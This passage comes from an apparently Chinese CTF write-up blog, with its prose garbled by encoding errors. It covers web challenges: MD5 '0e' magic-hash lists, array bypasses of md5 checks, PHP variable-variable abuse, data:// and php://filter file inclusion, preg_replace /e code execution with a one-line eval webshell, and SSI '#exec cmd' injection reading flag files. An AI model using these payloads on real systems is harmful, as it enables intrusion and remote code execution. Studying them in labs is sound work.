</span></span><span class=line><span class=cl>0e509367213418206700842008763514
</span></span><span class=line><span class=cl>s532378020a
</span></span><span class=line><span class=cl>0e220463095855511507588041205815
</span></span><span class=line><span class=cl>s878926199a
</span></span><span class=line><span class=cl>0e545993274517709034328855841020
</span></span><span class=line><span class=cl>s1091221200a
</span></span><span class=line><span class=cl>0e940624217856561557816327384675
</span></span><span class=line><span class=cl>s214587387a
</span></span><span class=line><span class=cl>0e848240448830537924465865611904
</span></span><span class=line><span class=cl>s1502113478a
</span></span><span class=line><span class=cl>0e861580163291561247404381396064
</span></span><span class=line><span class=cl>s1091221200a
</span></span><span class=line><span class=cl>0e940624217856561557816327384675
</span></span><span class=line><span class=cl>s1665632922a
</span></span><span class=line><span class=cl>0e731198061491163073197128363787
</span></span><span class=line><span class=cl>s1885207154a
</span></span><span class=line><span class=cl>0e509367213418206700842008763514
</span></span><span class=line><span class=cl>s1836677006a
</span></span><span class=line><span class=cl>0e481036490867661113260034900752
</span></span><span class=line><span class=cl>s1665632922a
</span></span><span class=line><span class=cl>0e731198061491163073197128363787
</span></span><span class=line><span class=cl>s878926199a
</span></span><span class=line><span class=cl>0e545993274517709034328855841020
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>å¤§å†™å­—æ¯ç±»ï¼š
</span></span><span class=line><span class=cl>QLTHNDT
</span></span><span class=line><span class=cl>0e405967825401955372549139051580
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>QNKCDZO
</span></span><span class=line><span class=cl>0e830400451993494058024219903391
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>EEIZDOI
</span></span><span class=line><span class=cl>0e782601363539291779881938479162
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>TUFEPMC
</span></span><span class=line><span class=cl>0e839407194569345277863905212547
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>UTIPEZQ
</span></span><span class=line><span class=cl>0e382098788231234954670291303879
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>UYXFLOI
</span></span><span class=line><span class=cl>0e552539585246568817348686838809
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>IHKFRNS
</span></span><span class=line><span class=cl>0e256160682445802696926137988570
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>PJNPDWY
</span></span><span class=line><span class=cl>0e291529052894702774557631701704
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>ABJIHVY
</span></span><span class=line><span class=cl>0e755264355178451322893275696586
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>DQWRASX
</span></span><span class=line><span class=cl>0e742373665639232907775599582643
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>DYAXWCA
</span></span><span class=line><span class=cl>0e424759758842488633464374063001
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>GEGHBXL
</span></span><span class=line><span class=cl>0e248776895502908863709684713578
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>GGHMVOE
</span></span><span class=line><span class=cl>0e362766013028313274586933780773
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>GZECLQZ
</span></span><span class=line><span class=cl>0e537612333747236407713628225676
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>NWWKITQ
</span></span><span class=line><span class=cl>0e763082070976038347657360817689
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>NOOPCJF
</span></span><span class=line><span class=cl>0e818888003657176127862245791911
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>MAUXXQC
</span></span><span class=line><span class=cl>0e478478466848439040434801845361
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>MMHUWUV
</span></span><span class=line><span class=cl>0e701732711630150438129209816536
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åæ˜¯ç¬¬ä¸‰å±‚ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20200928153644111.png loading=lazy></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s2>&#34;flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;param1&#39;</span><span class=p>]</span><span class=o>!==</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;param2&#39;</span><span class=p>]</span><span class=o>&amp;&amp;</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;param1&#39;</span><span class=p>])</span><span class=o>===</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;param2&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> 
</span></span></code></pre></td></tr></table></div></div><p>ç¬¬ä¸‰å±‚å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œç”±äºï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$a</span><span class=p>[]</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span> <span class=o>===</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span><span class=mi>1</span>
</span></span></code></pre></td></tr></table></div></div><p>æ•…ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20200928164219666.png loading=lazy></p><h2 id=mark-loves-cat>Mark loves cat</h2><p>è¿™é“é¢˜çœ‹äº†å¾ˆä¹…ï¼Œåˆšçœ‹åˆ°messageä»¥åŠgetçš„æ—¶å€™è§‰å¾—æ˜¯xssï¼Œä½†æ˜¯æä¸å®šï¼Œç„¶åå»çœ‹wpï¼Œå‘ç°æ˜¯gitæºç æ³„éœ²ï¼Œç„¶è€Œbuuçš„webç”¨dirsearchæ‰«æçš„æ—¶å€™æ°¸è¿œæ˜¯429-Too Many Requests&mldr;&mldr;.<img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20200929161506252.png loading=lazy alt=å•¥ä¹Ÿæ‰«ä¸å‡ºæ¥></p><p>çŸ¥é“æ˜¯gitæºç æ³„éœ²ä¹‹åç”¨githackä¸‹è½½ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20200929162248790.png loading=lazy></p><p>index.php:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;flag.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$yds</span> <span class=o>=</span> <span class=s2>&#34;dog&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$is</span> <span class=o>=</span> <span class=s2>&#34;cat&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$handsome</span> <span class=o>=</span> <span class=s1>&#39;yds&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_POST</span> <span class=k>as</span> <span class=nv>$x</span> <span class=o>=&gt;</span> <span class=nv>$y</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$$x</span> <span class=o>=</span> <span class=nv>$y</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_GET</span> <span class=k>as</span> <span class=nv>$x</span> <span class=o>=&gt;</span> <span class=nv>$y</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$$x</span> <span class=o>=</span> <span class=nv>$$y</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_GET</span> <span class=k>as</span> <span class=nv>$x</span> <span class=o>=&gt;</span> <span class=nv>$y</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=nv>$x</span> <span class=o>&amp;&amp;</span> <span class=nv>$x</span> <span class=o>!==</span> <span class=s1>&#39;flag&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>(</span><span class=nv>$handsome</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=nv>$yds</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;flag&#39;</span>  <span class=o>||</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;flag&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=nv>$is</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;the flag is: &#34;</span><span class=o>.</span><span class=nv>$flag</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™ä¸ªå¯å˜å˜é‡æŠŠæˆ‘ç»™ç»•æ™•äº†ã€‚ã€‚ã€‚å¯ä»¥çœ‹çœ‹<a class=link href=https://www.gem-love.com/ctf/824.html#Mark_loves_cat target=_blank rel=noopener>L&rsquo;Amoreå¤§ä½¬çš„wp</a></p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20200929170242835.png loading=lazy></p><h2 id=zjctfä¸è¿‡å¦‚æ­¤>ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><p>çœ‹äº†çœ‹é¢˜ç›®ï¼Œåº”è¯¥æ˜¯zjctfæŸé“é¢˜çš„æ”¹ç¼–ï¼Œé¦–å…ˆæ‰¾åˆ°zjctfçš„é¢˜ç›®ã€‚</p><p>ç¬¬ä¸€å±‚æ˜¯ä¸€æ ·çš„ï¼Œä½¿ç”¨data://ç»•è¿‡ã€‚payloadï¼š</p><p><code>?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=</code></p><p>æ¥ç€çœ‹åˆ°includeå‡½æ•°æƒ³åˆ°æ–‡ä»¶åŒ…å«ã€‚</p><p>payloadï¼š<code>?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20200929181134817.png loading=lazy alt=image-20200929181134817></p><p>å°†base64è§£ç ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$id</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$id</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>complex</span><span class=p>(</span><span class=nv>$re</span><span class=p>,</span> <span class=nv>$str</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>preg_replace</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;/(&#39;</span> <span class=o>.</span> <span class=nv>$re</span> <span class=o>.</span> <span class=s1>&#39;)/ei&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;strtolower(&#34;\\1&#34;)&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nv>$str</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_GET</span> <span class=k>as</span> <span class=nv>$re</span> <span class=o>=&gt;</span> <span class=nv>$str</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>complex</span><span class=p>(</span><span class=nv>$re</span><span class=p>,</span> <span class=nv>$str</span><span class=p>)</span><span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>getFlag</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=o>@</span><span class=k>eval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>åˆšå¼€å§‹å‘ç°getFlagå‡½æ•°å®šä¹‰äº†æ²¡æœ‰æ‰§è¡Œï¼ŒçŒœæµ‹æ˜¯ä½¿ç”¨complexå‡½æ•°æ¥æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯çœ‹äº†å¥½ä¹…è¿˜æ˜¯æ²¡æ€è·¯ã€‚ã€‚ã€‚</p><p>ç„¶åçœ‹äº†wpæ‰çŸ¥é“preg_replaceåœ¨/eæ¨¡å¼ä¸‹çš„RCE</p><p><a class=link href=https://xz.aliyun.com/t/2557 target=_blank rel=noopener>æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ</a></p><p>payloadï¼š<code>?\S*=${getflag()}&amp;cmd=system('cat /flag');</code></p><p>å½“ç„¶ï¼Œéƒ½RCEäº†ï¼Œä¹Ÿå¯ä»¥ä¸€å¥è¯æœ¨é©¬ç›´æ¥ä¸Šèšå‰‘</p><p><code>?\S*=${eval($_POST[kite])}</code></p><h2 id=easysearch>EasySearch</h2><p>çœ‹åˆ°é¢˜ç›®çš„searchæƒ³åˆ°æºç æ³„éœ²ï¼Œè®¿é—®index.php.swpå¾—åˆ°éƒ¨åˆ†æºç ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>	<span class=nx>ob_start</span><span class=p>();</span>	
</span></span><span class=line><span class=cl>	<span class=k>function</span> <span class=nf>get_hash</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$chars</span> <span class=o>=</span> <span class=s1>&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$random</span> <span class=o>=</span> <span class=nv>$chars</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>73</span><span class=p>)]</span><span class=o>.</span><span class=nv>$chars</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>73</span><span class=p>)]</span><span class=o>.</span><span class=nv>$chars</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>73</span><span class=p>)]</span><span class=o>.</span><span class=nv>$chars</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>73</span><span class=p>)]</span><span class=o>.</span><span class=nv>$chars</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>73</span><span class=p>)];</span><span class=c1>//Random 5 times
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nv>$content</span> <span class=o>=</span> <span class=nx>uniqid</span><span class=p>()</span><span class=o>.</span><span class=nv>$random</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$content</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Content-Type: text/html;charset=utf-8&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=o>***</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>])</span> <span class=k>and</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$admin</span> <span class=o>=</span> <span class=s1>&#39;6d0bc1&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=nv>$admin</span> <span class=o>==</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]),</span><span class=mi>0</span><span class=p>,</span><span class=mi>6</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$file_shtml</span> <span class=o>=</span> <span class=s2>&#34;public/&#34;</span><span class=o>.</span><span class=nx>get_hash</span><span class=p>()</span><span class=o>.</span><span class=s2>&#34;.shtml&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$shtml</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=nv>$file_shtml</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Unable to open file!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$text</span> <span class=o>=</span> <span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>            ***
</span></span></span><span class=line><span class=cl><span class=s1>            ***
</span></span></span><span class=line><span class=cl><span class=s1>            &lt;h1&gt;Hello,&#39;</span><span class=o>.</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=s1>            ***
</span></span></span><span class=line><span class=cl><span class=s1>			***&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$shtml</span><span class=p>,</span><span class=nv>$text</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>fclose</span><span class=p>(</span><span class=nv>$shtml</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=o>***</span>
</span></span><span class=line><span class=cl>			<span class=k>echo</span> <span class=s2>&#34;[!] Header  error ...&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=o>***</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=o>***</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>ç¬¬ä¸€å±‚ç›´æ¥çˆ†ç ´ï¼š</p><p>è‡ªå·±å†™çš„åƒåœ¾è„šæœ¬ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span><span class=nv>$i</span> <span class=o>&lt;</span> <span class=mi>9999999999</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$i</span><span class=p>),</span><span class=mi>0</span><span class=p>,</span><span class=mi>6</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;6d0bc1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;yes&#34;</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=nv>$i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$i</span><span class=o>%</span><span class=mi>1000000</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=k>echo</span> <span class=s2>&#34;***&#34;</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20200929211713316.png loading=lazy alt=image-20200929211713316></p><p>ç™»é™†æˆåŠŸ:</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20200929211756697.png loading=lazy></p><p>åœ¨å“åº”æ ‡å¤´é‡Œæ‰¾åˆ°éšæœºç”Ÿæˆçš„urlï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201004165154451.png loading=lazy></p><p>æ‰“å¼€ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201004165223729.png loading=lazy></p><p>ç„¶åæ˜¯ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼š<a class=link href=https://www.zhangfangzhou.cn/apache-ssi-configuration.html target=_blank rel=noopener>Apache å¼€å¯SSIé…ç½®ä½¿shtmlæ”¯æŒ include()å’ŒSSI Shellæ¼æ´é—®é¢˜</a></p><p>æœ¬é¢˜ä¸­æ²¡æœ‰è¿‡æ»¤ï¼Œç›´æ¥åœ¨usernameé‡Œæ‰“å°±å¯ä»¥äº†ï¼š</p><p><code>&lt;!--#exec cmd="ls ../"--></code></p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201004171037689.png loading=lazy alt=image-20201004171037689></p><p><code>&lt;!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--></code></p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201004171201673.png loading=lazy alt=image-20201004171201673></p><h2 id=cookie-is-so-stable>Cookie is so stable</h2><p>è€å›¾äº†ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_r.jpg loading=lazy alt=preview></p><p>ä¾æ¬¡æµ‹è¯•ï¼š <code>${7*7}</code>ï¼Œè¿”å›<code>${7*7}</code>ï¼Œä¸é€šè¿‡ï¼›æµ‹è¯•<code>{{7*7}}</code>ï¼Œè¿”å›49ï¼Œé€šè¿‡ï¼›æµ‹è¯• <code>{{7*'7'}}</code>ï¼Œè¿”å›49,åˆ¤æ–­æ¨¡æ¿ä¸ºtwig(å¦‚æœæ˜¯jinja2è¿”å›<code>7777777</code>ï¼Œå¹¶ä¸”twigæ˜¯phpï¼Œjinjaæ˜¯python)</p><p>çŸ¥è¯†ç‚¹é“¾æ¥ï¼š<a class=link 